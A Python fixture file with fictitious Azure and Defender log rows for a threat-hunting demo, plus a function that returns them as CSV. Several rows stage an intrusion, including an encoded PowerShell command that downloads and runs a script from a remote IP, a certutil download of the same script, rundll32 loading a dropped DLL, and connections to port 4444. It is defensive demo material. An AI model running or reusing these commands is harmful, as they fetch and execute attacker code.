# Synthetic (fully fictitious) log rows used by the public Vercel demo instead
# of a live Azure Log Analytics query. Lets get_query_context() and hunt()
# still make real OpenAI calls against realistic-looking data, without needing
# a live Azure credential or exposing real cyber-range telemetry.
#
# "{device}", "{caller}", and "{user}" are placeholders filled in from the
# model's own chosen device_name/caller/user_principal_name at request time
# (see get_demo_records below), so the data feels responsive to the question.

DEFAULT_DEVICE = "workstation-07"
DEFAULT_CALLER = "svc-deploy@cyberrange.local"
DEFAULT_USER = "jsmith@cyberrange.local"

TABLE_ROWS = {
    "DeviceProcessEvents": [
        {"TimeGenerated": "2026-09-03T09:12:04Z", "AccountName": "jsmith", "ActionType": "ProcessCreated", "DeviceName": "{device}", "InitiatingProcessCommandLine": "explorer.exe", "ProcessCommandLine": "chrome.exe"},
        {"TimeGenerated": "2026-09-03T09:14:51Z", "AccountName": "jsmith", "ActionType": "ProcessCreated", "DeviceName": "{device}", "InitiatingProcessCommandLine": "chrome.exe", "ProcessCommandLine": "notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt"},
        {"TimeGenerated": "2026-09-03T14:47:22Z", "AccountName": "jsmith", "ActionType": "ProcessCreated", "DeviceName": "{device}", "InitiatingProcessCommandLine": "winword.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAxAC4ANwA5AC4ANQAyAC4AMQAxAC8AcAAuAHAAcwAxACcAKQA="},
        {"TimeGenerated": "2026-09-03T14:47:23Z", "AccountName": "jsmith", "ActionType": "ProcessCreated", "DeviceName": "{device}", "InitiatingProcessCommandLine": "powershell.exe", "ProcessCommandLine": "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\upd.dll,DllMain"},
        {"TimeGenerated": "2026-09-03T14:48:01Z", "AccountName": "jsmith", "ActionType": "ProcessCreated", "DeviceName": "{device}", "InitiatingProcessCommandLine": "cmd.exe", "ProcessCommandLine": "certutil.exe -urlcache -f http://51.79.52.11/p.ps1 p.ps1"},
    ],
    "DeviceNetworkEvents": [
        {"TimeGenerated": "2026-09-03T09:15:10Z", "ActionType": "ConnectionSuccess", "DeviceName": "{device}", "RemoteIP": "142.250.72.14", "RemotePort": "443"},
        {"TimeGenerated": "2026-09-03T10:02:44Z", "ActionType": "ConnectionSuccess", "DeviceName": "{device}", "RemoteIP": "20.190.160.14", "RemotePort": "443"},
        {"TimeGenerated": "2026-09-03T14:48:05Z", "ActionType": "ConnectionSuccess", "DeviceName": "{device}", "RemoteIP": "51.79.52.11", "RemotePort": "4444"},
        {"TimeGenerated": "2026-09-03T14:52:19Z", "ActionType": "ConnectionSuccess", "DeviceName": "{device}", "RemoteIP": "51.79.52.11", "RemotePort": "4444"},
        {"TimeGenerated": "2026-09-03T14:55:47Z", "ActionType": "ConnectionSuccess", "DeviceName": "{device}", "RemoteIP": "185.220.101.7", "RemotePort": "9050"},
    ],
    "DeviceLogonEvents": [
        {"TimeGenerated": "2026-09-03T08:58:02Z", "AccountName": "jsmith", "DeviceName": "{device}", "ActionType": "LogonSuccess", "RemoteIP": "10.0.0.14", "RemoteDeviceName": ""},
        {"TimeGenerated": "2026-09-03T22:41:03Z", "AccountName": "administrator", "DeviceName": "{device}", "ActionType": "LogonFailed", "RemoteIP": "196.251.83.4", "RemoteDeviceName": ""},
        {"TimeGenerated": "2026-09-03T22:41:09Z", "AccountName": "administrator", "DeviceName": "{device}", "ActionType": "LogonFailed", "RemoteIP": "196.251.83.4", "RemoteDeviceName": ""},
        {"TimeGenerated": "2026-09-03T22:41:15Z", "AccountName": "administrator", "DeviceName": "{device}", "ActionType": "LogonFailed", "RemoteIP": "196.251.83.4", "RemoteDeviceName": ""},
        {"TimeGenerated": "2026-09-03T22:42:51Z", "AccountName": "administrator", "DeviceName": "{device}", "ActionType": "LogonSuccess", "RemoteIP": "196.251.83.4", "RemoteDeviceName": ""},
    ],
    "DeviceFileEvents": [
        {"TimeGenerated": "2026-09-03T09:20:11Z", "ActionType": "FileCreated", "DeviceName": "{device}", "FileName": "notes.txt", "FolderPath": "C:\\Users\\jsmith\\Documents", "InitiatingProcessAccountName": "jsmith", "SHA256": "8a1e3f2b9c4d5e6f7089a1b2c3d4e5f60718293a4b5c6d7e8f9012345abcdee"},
        {"TimeGenerated": "2026-09-03T14:47:24Z", "ActionType": "FileCreated", "DeviceName": "{device}", "FileName": "upd.dll", "FolderPath": "C:\\Users\\jsmith\\AppData\\Local\\Temp", "InitiatingProcessAccountName": "jsmith", "SHA256": "f4b1c2d3e4a5968718293a4b5c6d7e8f90123456789abcdef0123456789abcd"},
        {"TimeGenerated": "2026-09-03T14:48:07Z", "ActionType": "FileCreated", "DeviceName": "{device}", "FileName": "p.ps1", "FolderPath": "C:\\Users\\jsmith\\AppData\\Local\\Temp", "InitiatingProcessAccountName": "jsmith", "SHA256": "1122334455667788990011223344556677889900aabbccddeeff0011223344"},
        {"TimeGenerated": "2026-09-03T14:49:02Z", "ActionType": "FileCreated", "DeviceName": "{device}", "FileName": "update.exe", "FolderPath": "C:\\Users\\Public", "InitiatingProcessAccountName": "jsmith", "SHA256": "deadbeefcafebabe0011223344556677889900aabbccddeeff001122334455"},
    ],
    "AzureNetworkAnalytics_CL": [
        {"TimeGenerated": "2026-09-03T09:00:00Z", "FlowType_s": "AllowedFlow", "SrcPublicIPs_s": "10.0.1.4", "DestIP_s": "142.250.72.14", "DestPort_d": "443", "VM_s": "{device}", "AllowedInFlows_d": "12", "AllowedOutFlows_d": "18", "DeniedInFlows_d": "0", "DeniedOutFlows_d": "0"},
        {"TimeGenerated": "2026-09-03T14:50:00Z", "FlowType_s": "MaliciousFlow", "SrcPublicIPs_s": "51.79.52.11", "DestIP_s": "10.0.1.4", "DestPort_d": "4444", "VM_s": "{device}", "AllowedInFlows_d": "0", "AllowedOutFlows_d": "0", "DeniedInFlows_d": "31", "DeniedOutFlows_d": "9"},
        {"TimeGenerated": "2026-09-03T14:56:00Z", "FlowType_s": "MaliciousFlow", "SrcPublicIPs_s": "185.220.101.7", "DestIP_s": "10.0.1.4", "DestPort_d": "9050", "VM_s": "{device}", "AllowedInFlows_d": "0", "AllowedOutFlows_d": "0", "DeniedInFlows_d": "7", "DeniedOutFlows_d": "2"},
    ],
    "AzureActivity": [
        {"TimeGenerated": "2026-09-03T09:05:00Z", "OperationNameValue": "MICROSOFT.RESOURCES/SUBSCRIPTIONS/RESOURCEGROUPS/READ", "ActivityStatusValue": "Success", "ResourceGroup": "Cyber-Range-Admin-SOC", "Caller": "{caller}", "CallerIpAddress": "10.0.0.14", "Category": "Administrative"},
        {"TimeGenerated": "2026-09-03T23:10:00Z", "OperationNameValue": "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE", "ActivityStatusValue": "Success", "ResourceGroup": "Cyber-Range-Admin-SOC", "Caller": "{caller}", "CallerIpAddress": "196.251.83.4", "Category": "Administrative"},
        {"TimeGenerated": "2026-09-03T23:12:00Z", "OperationNameValue": "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", "ActivityStatusValue": "Success", "ResourceGroup": "Cyber-Range-Admin-SOC", "Caller": "{caller}", "CallerIpAddress": "196.251.83.4", "Category": "Administrative"},
    ],
    "SigninLogs": [
        {"TimeGenerated": "2026-09-03T08:57:40Z", "UserPrincipalName": "{user}", "OperationName": "Sign-in activity", "Category": "SignInLogs", "ResultSignature": "0", "ResultDescription": "Success", "AppDisplayName": "Office 365", "IPAddress": "10.0.0.14", "LocationDetails": "Seattle, US"},
        {"TimeGenerated": "2026-09-03T22:40:02Z", "UserPrincipalName": "{user}", "OperationName": "Sign-in activity", "Category": "SignInLogs", "ResultSignature": "50126", "ResultDescription": "Invalid username or password", "AppDisplayName": "Office 365", "IPAddress": "196.251.83.4", "LocationDetails": "Lagos, NG"},
        {"TimeGenerated": "2026-09-03T22:40:19Z", "UserPrincipalName": "{user}", "OperationName": "Sign-in activity", "Category": "SignInLogs", "ResultSignature": "50126", "ResultDescription": "Invalid username or password", "AppDisplayName": "Office 365", "IPAddress": "196.251.83.4", "LocationDetails": "Lagos, NG"},
        {"TimeGenerated": "2026-09-03T22:43:07Z", "UserPrincipalName": "{user}", "OperationName": "Sign-in activity", "Category": "SignInLogs", "ResultSignature": "0", "ResultDescription": "Success", "AppDisplayName": "Office 365", "IPAddress": "196.251.83.4", "LocationDetails": "Lagos, NG"},
    ],
}


def get_demo_records(table_name, fields, device_name="", caller="", user_principal_name=""):
    """
    Returns (records_csv_text, count) of synthetic rows for table_name,
    projected down to the requested `fields` (a comma-separated string,
    matching the shape EXECUTOR.query_log_analytics's callers already use).
    """
    rows = TABLE_ROWS.get(table_name, [])
    if not rows:
        return "", 0

    device = device_name.strip() or DEFAULT_DEVICE
    caller_value = caller.strip() or DEFAULT_CALLER
    user_value = user_principal_name.strip() or DEFAULT_USER

    def substitute(value):
        return (
            value.replace("{device}", device)
            .replace("{caller}", caller_value)
            .replace("{user}", user_value)
        )

    columns = [f.strip() for f in fields.split(",") if f.strip()]
    if not columns:
        columns = list(rows[0].keys())

    lines = [",".join(columns)]
    for row in rows:
        lines.append(",".join(substitute(str(row.get(col, ""))) for col in columns))

    return "\n".join(lines), len(rows)
